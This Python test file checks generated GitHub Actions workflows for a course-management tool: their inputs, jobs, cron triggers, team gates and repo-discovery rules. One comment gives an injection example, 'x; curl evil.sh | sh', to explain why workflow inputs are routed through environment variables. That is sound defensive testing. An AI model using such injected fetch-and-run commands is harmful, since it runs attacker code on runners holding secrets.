"""The workflow renderers must emit GitHub-parseable YAML with the right inputs/jobs.

A typo in any of these silently breaks a faculty button for every course, so the cheapest
useful guard is: render -> yaml.safe_load -> assert the contract. No network.
"""

from __future__ import annotations

import pytest
import yaml

from conftest import workflow_inputs, workflow_jobs
from dsl_course import seed

# Renderers that take no args (or only simple lists) -> a quick "it parses" sweep.
ALL_RENDERED = {
    "release": seed.render_release(
        ["Cohort-f2026"], ["1", "2"], ["lectures", "labs"]
    ),
    "central_release": seed.render_central_release(
        ["course-materials-f2026"], ["Cohort-f2026"]
    ),
    "provision": seed.render_provision(["Cohort-f2026"], ["assignment-1-f2026"]),
    "grade_assignment": seed.render_grade_assignment(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "release_code": seed.render_release_code(["Cohort-f2026"], ["materials"]),
    "sync_membership": seed.render_sync_membership(["Cohort-f2026"]),
    "send_codes": seed.render_send_codes(["Cohort-f2026"]),
    "sync_gradebooks": seed.render_sync_gradebooks(["Cohort-f2026"]),
    "render_grades": seed.render_render_grades(["Cohort-f2026"]),
    "distribute_grades": seed.render_distribute_grades(["Cohort-f2026"]),
    "bootstrap_cohort": seed.render_bootstrap_cohort(),
    "refresh": seed.render_refresh(),
    "new_materials": seed.render_new_materials(),
    "new_assignment": seed.render_new_assignment(),
    "sync_site": seed.render_sync_site(["Cohort-f2026"]),
    "publish_site": seed.render_publish_site(["course-materials-f2026"]),
    "status": seed.render_status(["Cohort-f2026"]),
}


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_renders_valid_yaml(name):
    doc = yaml.safe_load(ALL_RENDERED[name])
    assert isinstance(doc, dict) and doc.get("name")
    # Every faculty workflow is a workflow_dispatch with a check-team gate.
    assert "check-team" in workflow_jobs(ALL_RENDERED[name])


def test_publish_site_inputs():
    inp = workflow_inputs(
        seed.render_publish_site(["course-materials-f2026", "course-materials-f2025"])
    )
    assert set(inp) == {"source_repo", "readings_mode", "include_lectures"}
    assert inp["source_repo"]["options"] == [
        "course-materials-f2026",
        "course-materials-f2025",
    ]
    assert inp["readings_mode"]["options"] == [
        "reading-list",
        "actual-readings",
        "none",
    ]
    assert inp["readings_mode"]["default"] == "reading-list"
    assert inp["include_lectures"]["type"] == "boolean"


def test_publish_site_has_publish_job_running_public_sync():
    rendered = seed.render_publish_site(["course-materials-f2026"])
    assert "publish" in workflow_jobs(rendered)
    assert "dsl_course.site public-sync" in rendered
    # include_lectures off must map to the CLI flag.
    assert "--no-include-lectures" in rendered


def test_publish_site_cron_resyncs_from_persisted_settings():
    # The only flow that used to need a human re-click: a daily cron now re-runs the last
    # publish's persisted settings (public-sync with no source args), while the manual
    # button keeps its inputs and its check-team gate exactly as before.
    rendered = seed.render_publish_site(["course-materials-f2026"])
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger["schedule"] == [{"cron": "30 5 * * *"}]
    assert "workflow_dispatch" in trigger
    jobs = workflow_jobs(rendered)
    resync = jobs["resync"]
    assert resync["if"] == "github.event_name == 'schedule'"
    assert "needs" not in resync  # cron has no actor, so it skips the check-team gate
    run = resync["steps"][-1]["run"]
    assert "python3 -m dsl_course.site public-sync --course-org" in run
    assert "--source-repo" not in run  # no inputs: the settings come from the site repo
    assert jobs["publish"]["needs"] == "check-team"


def test_provision_has_group_toggle():
    inp = workflow_inputs(
        seed.render_provision(["Cohort-f2026"], ["assignment-4-project-f2026"])
    )
    assert inp["group"]["type"] == "boolean"
    assert inp["group"]["default"] is False
    assert "--group" in seed.render_provision(["Cohort-f2026"], [])


def test_grade_assignment_calls_collect_with_no_deadline_input():
    # SSOT: the grading deadline comes from the cohort schedule, so the button has no
    # deadline input and never passes --deadline (collect derives it).
    rendered = seed.render_grade_assignment(["Cohort-f2026"], ["assignment-1-f2026"])
    inp = workflow_inputs(rendered)
    assert "deadline" not in inp and inp["group"]["type"] == "boolean"
    assert "dsl_course.collect" in rendered
    assert "--group" in rendered and "--deadline" not in rendered


def test_sync_membership_is_a_consolidated_reconcile():
    # One consolidated, fully-automatic reconcile (roster + teams + faculty) - no
    # --prune toggle at this level, config is always the live truth.
    rendered = seed.render_sync_membership(["Cohort-f2026"])
    inp = workflow_inputs(rendered)
    assert set(inp) == {"cohort_org"}
    assert inp["cohort_org"]["default"] == seed._FACULTY_ONLY
    assert inp["cohort_org"]["options"] == [seed._FACULTY_ONLY, "Cohort-f2026"]
    assert "dsl_course.sync_membership" in rendered
    assert "--prune" not in rendered
    jobs = workflow_jobs(rendered)
    assert {"check-team", "sync-dispatch", "sync-auto"} <= set(jobs)
    trigger = yaml.safe_load(rendered).get("on", yaml.safe_load(rendered).get(True))
    assert set(trigger) == {"push", "repository_dispatch", "schedule", "workflow_dispatch"}


def test_dotgithub_readme_orients_faculty():
    # The .github repo's own README points faculty at the Actions tab where the buttons live.
    course = seed.render_dotgithub_readme("My-Course-E1", "My Course", is_cohort=False)
    assert "control panel" in course
    assert "My-Course-E1/.github/actions" in course
    # A cohort org sends faculty to the parent course org for the buttons instead.
    cohort = seed.render_dotgithub_readme(
        "My-Course-f2026", "My Course", is_cohort=True
    )
    assert "parent course org" in cohort


def test_release_has_a_checkbox_and_path_field_per_section():
    rendered = seed.render_release(["Cohort-f2026"], ["1", "2"], ["lectures", "labs"])
    inp = workflow_inputs(rendered)
    assert set(inp) == {
        "cohort_org",
        "release_lectures",
        "lectures_path",
        "release_labs",
        "labs_path",
        "sessions",
        "include_root_files",
    }
    # Checkbox defaults on; path has no default (blank means "use the section's own name").
    assert inp["release_lectures"]["type"] == "boolean"
    assert inp["release_lectures"]["default"] is True
    assert "default" not in inp["lectures_path"]
    # Syllabus + README are one merged toggle (each section already costs 2 inputs,
    # so this saves a slot rather than keeping them separate).
    assert inp["include_root_files"]["type"] == "boolean"
    # Sessions is free text (no multi-select widget in workflow_dispatch), with the
    # discovered sessions surfaced in the description for reference.
    assert "type" not in inp["sessions"]
    assert "1, 2" in inp["sessions"]["description"]
    # No standalone cohort_repo dropdown - destination routing replaces it.
    assert "cohort_repo" not in inp


def test_release_builds_destinations_from_checkbox_and_path_fields():
    rendered = seed.render_release(["Cohort-f2026"], ["1"], ["lectures", "labs"])
    assert "RELEASE_LECTURES: ${{ inputs.release_lectures }}" in rendered
    assert "PATH_LECTURES: ${{ inputs.lectures_path }}" in rendered
    # Unchecked -> not released regardless of path; checked with a blank path ->
    # falls back to the section's own name via bash parameter expansion.
    assert (
        '[ "$RELEASE_LECTURES" = "true" ] && destinations="$destinations lectures=${PATH_LECTURES:-lectures}"'
        in rendered
    )
    assert '--destinations "$destinations"' in rendered
    assert "--sessions \"$SESSIONS\"" in rendered


def test_release_rejects_sections_that_collide_on_env_var_name():
    # Shell env var names can't hold hyphens, so section names are folded ('-' -> '_')
    # to build them - two sections differing only by hyphen vs underscore would
    # otherwise silently share one env var and drop a destination.
    with pytest.raises(ValueError, match="case-studies.*case_studies|case_studies.*case-studies"):
        seed.render_release(["Cohort-f2026"], ["1"], ["case-studies", "case_studies"])


def test_central_release_shares_checkbox_and_path_fields_with_the_repo_button():
    # sections here represent the union discovered across every content repo in the
    # org (computed by the caller, seed_github_workflows) - the central button no
    # longer has a separate cohort_repo/exclude fallback.
    rendered = seed.render_central_release(
        ["course-materials-f2026"], ["Cohort-f2026"], ["lectures", "labs"]
    )
    inp = workflow_inputs(rendered)
    assert {"source_repo", "cohort_org", "release_lectures", "lectures_path", "sessions"} <= set(inp)
    assert "cohort_repo" not in inp
    assert "exclude" not in inp


def test_max_release_sections_caps_at_ten_input_budget():
    # 4 fixed inputs (cohort_org, sessions, include_root_files, source_repo) + 2 per
    # section must not exceed GitHub's 10-input cap on the tighter (central) button.
    assert 4 + 2 * seed.MAX_RELEASE_SECTIONS <= 10


def test_cap_sections_logs_and_truncates_past_the_limit(capsys):
    capped = seed._cap_sections(
        ["lectures", "labs", "readings", "handouts"], "org/repo"
    )
    assert capped == ["handouts", "labs", "lectures"]  # sorted, first 3
    err = capsys.readouterr().err
    assert "readings" in err and "org/repo" in err


INFRA_AND_CONTENT = [
    {"name": ".github", "topics": []},
    {"name": "welcome", "topics": []},
    {"name": "classroom-config", "topics": []},
    {"name": "my-course-f2026.github.io", "topics": []},  # the generated site repo
    {"name": "grades-alice", "topics": ["gradebook"]},  # private student gradebook
    {"name": "assignment-1-f2026-alice", "topics": ["submission"]},
    {"name": "assignment-1-f2026-template", "topics": ["assignment-template"]},
    {"name": "course-materials-f2026", "topics": []},
    {"name": "labs", "topics": ["teaching"]},
]


def test_is_infra_repo_excludes_by_name_and_by_topic():
    infra, content = INFRA_AND_CONTENT[:7], INFRA_AND_CONTENT[7:]
    assert all(seed._is_infra_repo(r) for r in infra)
    assert not any(seed._is_infra_repo(r) for r in content)
    assert not seed._is_infra_repo({"name": "notes"})  # topics key absent -> content


def test_both_discover_functions_apply_the_same_infra_exclusions(monkeypatch):
    # One shared predicate: the public <org>.github.io site repo must never be treated
    # as a content repo (those HOST the faculty workflows and get DSL_BOT_TOKEN set as a
    # repo secret), and gradebooks/submissions must never appear as release targets.
    monkeypatch.setattr(seed, "list_org_repos", lambda org: INFRA_AND_CONTENT)
    expected = ["course-materials-f2026", "labs"]
    assert seed.discover_cohort_repos(["Cohort-f2026"]) == expected
    assert seed.discover_content_repos("My-Course-E1234") == expected


def test_discover_content_repos_also_excludes_assignment_templates_by_name(monkeypatch):
    # Course-org assignment templates carry no `assignment-template` topic (that one is
    # set on the frozen cohort-side copy), so the name prefix is the content-side rule.
    monkeypatch.setattr(
        seed,
        "list_org_repos",
        lambda org: [
            {"name": "assignment-1-f2026", "topics": ["assignment"]},
            {"name": "course-materials-f2026", "topics": []},
        ],
    )
    assert seed.discover_content_repos("My-Course-E1234") == ["course-materials-f2026"]


def test_list_org_repos_paginates_instead_of_capping(monkeypatch):
    # A cohort org holds a repo per student per assignment plus a gradebook each, so any
    # fixed --limit silently truncates discovery. --paginate walks every page, and each
    # page's --jq output is NDJSON (not one concatenated array).
    calls = []
    pages = (
        '{"name":"a","topics":[],"isTemplate":false}\n'
        '{"name":"b","topics":[],"isTemplate":true}\n'
    )
    monkeypatch.setattr(seed, "gh", lambda *args: (calls.append(args), (0, pages))[1])
    assert [r["name"] for r in seed.list_org_repos("Org")] == ["a", "b"]
    assert "--paginate" in calls[0] and "--limit" not in calls[0]
    assert "orgs/Org/repos?per_page=100" in calls[0]


def test_list_org_repos_reports_a_failed_listing_as_empty(monkeypatch, capsys):
    monkeypatch.setattr(seed, "gh", lambda *args: (1, "gh: HTTP 502"))
    assert seed.list_org_repos("Org") == []
    assert "Org" in capsys.readouterr().err


def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
    # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
    # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
    # user-supplied input must reach the script as an env var instead.
    materials, assignment = seed.render_new_materials(), seed.render_new_assignment()
    for rendered in (materials, assignment):
        step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
        assert "${{" not in step["run"]
        assert step["env"]["TAG"] == "${{ inputs.tag }}"
    assert '--tag "$TAG"' in materials
    assert '--number "$NUMBER"' in assignment


def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
    from pathlib import Path

    wf = (
        Path(__file__).resolve().parents[1] / ".github" / "workflows" / "bootstrap-org.yml"
    ).read_text()
    step = yaml.safe_load(wf)["jobs"]["bootstrap"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["ORG"] == "${{ inputs.org }}"
    assert step["env"]["ORG_NAME"] == "${{ inputs.org_name }}"
    assert step["env"]["COURSE_CODE"] == "${{ inputs.course_code }}"


def test_discover_sections_union_combines_across_content_repos(monkeypatch):
    monkeypatch.setattr(
        seed,
        "discover_sections",
        lambda org, repo: {"a": ["lectures"], "b": ["labs", "readings"]}[repo],
    )
    assert seed.discover_sections_union("org", ["a", "b"]) == ["labs", "lectures", "readings"]


def test_discover_release_sources_detects_root_and_nested_shapes(monkeypatch):
    # root shape: a release left its per-section path blank, so the repo itself is one
    # section and sessions sit directly at its root (labs/lectures in a live course).
    # nested shape: a release routed a section under a shared repo's own subfolder.
    trees = {
        "labs": ["01_intro", "02_functions", "materials/01_intro", "readings"],
        "lectures": ["01_intro"],
    }
    monkeypatch.setattr(seed, "_repo_tree_dirs", lambda org, repo: trees[repo])
    sources = seed.discover_release_sources("org", ["labs", "lectures"])
    assert set(sources) == {
        ("labs", "", "01_intro", 1),
        ("labs", "", "02_functions", 2),
        ("labs", "materials", "01_intro", 1),
        ("lectures", "", "01_intro", 1),
    }


def test_choice_falls_back_when_empty():
    # An empty dropdown must still be valid YAML (a placeholder option), never blank.
    assert "(none-yet)" in seed._choice([])
    inp = workflow_inputs(seed.render_publish_site([]))
    assert inp["source_repo"]["options"] == ["(none-yet)"]


def test_sync_site_auto_resyncs_on_sourced_changes():
    # Sync site must auto-fire (no manual click) on the things the site reads: a push to
    # the course dsl-course.yml, a repository_dispatch from a cohort's schedule.yml, and a
    # daily cron catch-all. The auto path is ungated (no check-team); manual stays gated.
    doc = yaml.safe_load(seed.render_sync_site(["Cohort-f2026"]))
    trigger = doc.get("on", doc.get(True))
    assert "dsl-course.yml" in trigger["push"]["paths"]
    assert trigger["repository_dispatch"]["types"] == ["sync-site"]
    assert trigger["schedule"][0]["cron"] == "0 6 * * *"
    assert "workflow_dispatch" in trigger
    jobs = doc["jobs"]
    # the ungated auto job runs for non-manual events; the gated one needs check-team
    assert jobs["sync-auto"]["if"] == "github.event_name != 'workflow_dispatch'"
    assert "check-team" not in jobs["sync-auto"].get("needs", "")
    assert jobs["sync"]["needs"] == "check-team"


def test_classroom_config_site_dispatcher_fires_on_schedule_change():
    from pathlib import Path

    tmpl = (
        Path(__file__).resolve().parents[1]
        / "templates" / "classroom-config" / "dispatch-sync-site.yml"
    ).read_text()
    doc = yaml.safe_load(tmpl)
    trigger = doc.get("on", doc.get(True))
    assert trigger["push"]["paths"] == ["schedule.yml"]
    assert "sync-site" in tmpl  # dispatches the sync-site event
